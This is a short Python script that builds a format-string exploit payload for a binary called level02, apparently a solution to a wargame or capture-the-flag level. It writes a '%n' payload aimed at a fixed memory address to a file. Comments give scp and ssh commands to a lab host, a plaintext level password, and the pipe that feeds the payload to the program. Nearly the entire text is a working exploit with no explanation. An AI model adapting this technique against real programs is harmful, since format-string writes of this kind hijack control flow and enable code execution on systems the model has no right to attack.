payload = b''
payload += b'%4196997x%8$n'
payload += b'A' * (99 - len(payload))
payload += b'\x28\x12\x60'

file = open("payload", "wb")
file.write(payload)
file.close()

# python3 shell.py
# scp -P 4242 payload level02@192.168.1.3:/tmp/payload      (pass : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv)
# ssh level02@192.168.1.3 -p 4242                           (pass : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv)
# cat /tmp/payload - | ./level02
